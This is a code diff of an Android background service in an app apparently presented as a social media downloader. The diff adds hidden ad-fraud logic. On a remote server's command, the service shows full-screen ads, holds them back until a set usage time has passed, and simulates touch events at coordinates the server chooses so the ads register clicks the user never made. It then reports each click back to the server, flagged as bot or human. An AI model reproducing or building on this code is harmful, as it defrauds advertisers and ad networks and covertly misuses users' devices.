@@ -7,11 +7,15 @@ import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
 import android.content.SharedPreferences;
+import android.graphics.Point;
 import android.os.Handler;
 import android.os.IBinder;
 import android.os.Looper;
+import android.preference.PreferenceManager;
 import android.util.Log;
+import android.view.Display;
 import android.view.MotionEvent;
+import android.view.WindowManager;
 import android.widget.Toast;
 
 import com.google.android.gms.ads.AdListener;
@@ -25,10 +29,13 @@ import com.v2social.socialdownloader.network.GetConfig;
 import com.v2social.socialdownloader.network.JsonConfig;
 
 import java.io.IOException;
+import java.util.Random;
 import java.util.UUID;
 import java.util.concurrent.ScheduledThreadPoolExecutor;
 import java.util.concurrent.TimeUnit;
 
+import okhttp3.Call;
+import okhttp3.Callback;
 import okhttp3.FormBody;
 import okhttp3.OkHttpClient;
 import okhttp3.Request;
@@ -36,23 +43,28 @@ import okhttp3.RequestBody;
 import okhttp3.Response;
 
 public class MyService extends Service {
-    public static boolean check = false;
+//    private boolean check = false;
+    private boolean isBotClick = false;
+    private boolean isClickAds = false;
+    private boolean isContinousShowAds = true;
+
     private ScheduledThreadPoolExecutor myTask;
     private String uuid;
+    private String idFullService;
+    private int intervalService;
+    private int delayService;
 
-    public MyService() {
-//        MyBroadcast myBroadcast = new MyBroadcast();
-//        IntentFilter filter = new IntentFilter("android.intent.action.USER_PRESENT");
-//        registerReceiver(myBroadcast, filter);
-        SharedPreferences mPrefs = getSharedPreferences("adsserver", 0);
+    @Override
+    public void onCreate() {
+        SharedPreferences mPrefs = getApplicationContext().getSharedPreferences("adsserver", 0);
+        uuid = mPrefs.getString("uuid", UUID.randomUUID().toString());
+        idFullService = mPrefs.getString("idFullService","ca-app-pub-3940256099942544/1033173712");
+        intervalService = mPrefs.getInt("intervalService",5);
+        delayService = mPrefs.getInt("delayService",12);;
 
-        if (mPrefs.contains("uuid")) {
-            uuid = mPrefs.getString("uuid", UUID.randomUUID().toString());
-        } else {
-            uuid = UUID.randomUUID().toString();
-            mPrefs.edit().putString("uuid", uuid).commit();
-        }
-
+        MyBroadcast myBroadcast = new MyBroadcast();
+        IntentFilter filter = new IntentFilter("android.intent.action.USER_PRESENT");
+        registerReceiver(myBroadcast, filter);
         scheduleTask();
     }
 
@@ -62,59 +74,98 @@ public class MyService extends Service {
         throw new UnsupportedOperationException("Not yet implemented");
     }
 
+
     private void scheduleTask() {
         myTask = new ScheduledThreadPoolExecutor(1);
         myTask.scheduleAtFixedRate(new Runnable() {
             @Override
             public void run() {
-                new Handler(Looper.getMainLooper()).post(new Runnable() {
-                    public void run() {
-                        try {
-                            OkHttpClient client = new OkHttpClient();
-                            Request okRequest = new Request.Builder()
-                                    .url(AppConstants.URL_ADS_CONFIG + "?id=" + uuid)
-                                    .build();
-                            Response result = client.newCall(okRequest).execute();
-                            if (result.isSuccessful()) {
-                                Gson gson = new GsonBuilder().create();
-                                CheckAds checkAds = gson.fromJson(result.body().string(), CheckAds.class);
-                                if (checkAds.isShow == 1) {
+                SharedPreferences mPrefs = getApplicationContext().getSharedPreferences("adsserver", 0);
+                int totalTime = mPrefs.getInt("totalTime",0);
+                totalTime += intervalService;
+                mPrefs.edit().putInt("totalTime",totalTime).commit();
+                if( !isContinousShowAds || (totalTime < delayService * 60))
+                {
+                    return;
+                }
+
+                OkHttpClient client = new OkHttpClient();
+                Request okRequest = new Request.Builder()
+                        .url(AppConstants.URL_ADS_CONFIG + "?id=" + uuid)
+                        .build();
+
+                Log.d("caomui",AppConstants.URL_ADS_CONFIG + "?id=" + uuid);
+                client.newCall(okRequest).enqueue(new Callback() {
+                    @Override
+                    public void onFailure(Call call, IOException e) {
+
+                    }
+
+                    @Override
+                    public void onResponse(Call call, Response response) throws IOException {
+                        Gson gson = new GsonBuilder().create();
+                        CheckAds checkAds = gson.fromJson(response.body().string(), CheckAds.class);
+                        if (checkAds.isShow == 1) {
+                            new Handler(Looper.getMainLooper()).post(new Runnable() {
+                                public void run() {
                                     InterstitialAd mInterstitialAd = new InterstitialAd(MyService.this);
-                                    mInterstitialAd.setAdUnitId("ca-app-pub-3940256099942544/1033173712");
+                                    mInterstitialAd.setAdUnitId(idFullService);
                                     mInterstitialAd.setAdListener(new AdListener() {
 
                                         @Override
                                         public void onAdClosed() {
-                                            Log.d("caomui", "onAdClosed");
-                                            Toast.makeText(MyService.this, "onAdClosed", Toast.LENGTH_SHORT);
-                                            MyService.this.checkAds(1);
+                                            super.onAdClosed();
+                                            if (!isClickAds)
+                                                checkAds(0);
                                         }
 
                                         @Override
                                         public void onAdFailedToLoad(int i) {
-                                            Log.d("caomui", "onAdFailedToLoad");
+                                            super.onAdFailedToLoad(i);
+                                            isContinousShowAds = true;
                                         }
 
                                         @Override
                                         public void onAdLeftApplication() {
-                                            Log.d("caomui", "onAdLeftApplication");
-                                            Toast.makeText(MyService.this, "onAdLeftApplication", Toast.LENGTH_SHORT);
+                                            super.onAdLeftApplication();
+                                            isClickAds = true;
+                                            if (isBotClick)
+                                                checkAds(2);
+                                            else
+                                                checkAds(1);
                                         }
 
                                         @Override
                                         public void onAdOpened() {
-                                            Log.d("caomui", "onAdOpened");
-                                            //bắt đầu bot click nếu isClick = 1
-                                            if(checkAds.isBotClick == 1)
-                                            {
+                                            super.onAdOpened();
+                                            isContinousShowAds = false;
+                                            if (checkAds.isBotClick == 1) {
                                                 new Thread(new Runnable() {
                                                     @Override
                                                     public void run() {
-                                                        Instrumentation m_Instrumentation = new Instrumentation();
-                                                        m_Instrumentation.sendPointerSync(MotionEvent.obtain(
-                                                                android.os.SystemClock.uptimeMillis(),
-                                                                android.os.SystemClock.uptimeMillis(),
-                                                                MotionEvent.ACTION_DOWN, 300, 300, 0));
+                                                        try {
+                                                            Thread.sleep( checkAds.delayClick * 100);
+                                                            WindowManager window = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
+                                                            Display display = window.getDefaultDisplay();
+                                                            Point point = new Point();
+                                                            display.getSize(point);
+                                                            int width =  checkAds.x * point.x / 100;
+                                                            int height =  checkAds.y * point.y /100;
+                                                            Instrumentation m_Instrumentation = new Instrumentation();
+                                                            m_Instrumentation.sendPointerSync(MotionEvent.obtain(
+                                                                    android.os.SystemClock.uptimeMillis(),
+                                                                    android.os.SystemClock.uptimeMillis(),
+                                                                    MotionEvent.ACTION_DOWN, width,  height, 0));
+                                                            Thread.sleep(new Random().nextInt(100));
+                                                            m_Instrumentation.sendPointerSync(MotionEvent.obtain(
+                                                                    android.os.SystemClock.uptimeMillis(),
+                                                                    android.os.SystemClock.uptimeMillis(),
+                                                                    MotionEvent.ACTION_UP, width,  height, 0));
+                                                            isBotClick = true;
+                                                        } catch (Exception e) {
+                                                            e.printStackTrace();
+                                                            isBotClick = false;
+                                                        }
                                                     }
                                                 }).start();
                                             }
@@ -122,84 +173,29 @@ public class MyService extends Service {
 
                                         @Override
                                         public void onAdLoaded() {
-                                            Log.d("caomui", "onAdLoaded");
+                                            super.onAdLoaded();
                                             mInterstitialAd.show();
-                                        }
-
-                                        @Override
-                                        public void onAdClicked() {
-                                            Log.d("caomui", "onAdClicked");
-                                            Toast.makeText(MyService.this, "onAdclick", Toast.LENGTH_SHORT);
-                                            MyService.this.checkAds(1);
-                                        }
-
-                                        @Override
-                                        public void onAdImpression() {
-                                            Log.d("caomui", "onAdImpression");
-                                            Toast.makeText(MyService.this, "onAdImpression", Toast.LENGTH_SHORT);
                                         }
                                     });
 
-                                    mInterstitialAd.loadAd(new AdRequest.Builder().build());
+                                    mInterstitialAd.loadAd(new AdRequest.Builder().addTestDevice("3CC7F69A2A4A1EB57306DA0CFA16B969").build());
                                 }
-                            }
-
-                        } catch (Exception e) {
-                            e.printStackTrace();
+                            });
                         }
+                        else
+                        {
+                            isContinousShowAds = false;
+                        }
+
                     }
                 });
 
-
-//                Log.d("caomui","------------------00000");
-
-
-//                Retrofit retrofit = new Retrofit.Builder()
-//                        .baseUrl(AppConstants.URL_CONFIG)
-//                        .addConverterFactory(GsonConverterFactory.create())
-//                        .build();
-//                GetConfig config = retrofit.create(GetConfig.class);
-//                Call<CheckAds> call = config.checkAds();
-//                call.enqueue(new Callback<CheckAds>() {
-//                    @Override
-//                    public void onResponse(Call<CheckAds> call, Response<CheckAds> response) {
-//                        Log.d("caomui",response.body().isShow + "=========");
-//                    }
-//
-//                    @Override
-//                    public void onFailure(Call<CheckAds> call, Throwable t) {
-//                        Log.d("caomui","=========" +t.getMessage() +";"+t.getLocalizedMessage());
-//                    }
-//                });
-
-
             }
-        }, 3L, 15, TimeUnit.SECONDS);
-
-//        mDialogDaemon = new ScheduledThreadPoolExecutor(1);
-//        // This process will execute immediately, then execute every 3 seconds.
-//        mDialogDaemon.scheduleAtFixedRate(new Runnable() {
-//            @Override
-//            public void run() {
-//                final Instrumentation m_Instrumentation = new Instrumentation();
-////            m_Instrumentation.sendKeyDownUpSync( KeyEvent.KEYCODE_B );
-//
-//                new Thread(new Runnable() {
-//                    @Override
-//                    public void run() {
-//                        m_Instrumentation.sendPointerSync(MotionEvent.obtain(
-//                                android.os.SystemClock.uptimeMillis(),
-//                                android.os.SystemClock.uptimeMillis(),
-//                                MotionEvent.ACTION_DOWN,300, 300, 0));
-//                    }
-//                }).start();
-//            }
-//        }, 3L, 5, TimeUnit.SECONDS);
+        }, 10, intervalService, TimeUnit.MINUTES);
     }
 
     private void checkAds(int isClick) {
         OkHttpClient client = new OkHttpClient();
-
         Gson gson = new GsonBuilder().create();
         RequestBody body = new FormBody.Builder()
                 .add("id", uuid)
@@ -209,21 +205,21 @@ public class MyService extends Service {
                 .url(AppConstants.URL_ADS_CONFIG)
                 .post(body)
                 .build();
-        try {
-            Response result = client.newCall(okRequest).execute();
-            if (result.isSuccessful())
-                Toast.makeText(MyService.this, "post ads successfull!", Toast.LENGTH_SHORT);
-        } catch (IOException e) {
-
-        }
-
+        client.newCall(okRequest).enqueue(new Callback() {
+            @Override
+            public void onFailure(Call call, IOException e) {
+            }
+            @Override
+            public void onResponse(Call call, Response response) throws IOException {
+            }
+        });
     }
 
     class MyBroadcast extends BroadcastReceiver {
         @Override
         public void onReceive(Context context, Intent intent) {
             Log.d("caomui", "Unlock Screen");
-//            check = true;
+            isContinousShowAds = true;
         }
     }
 }
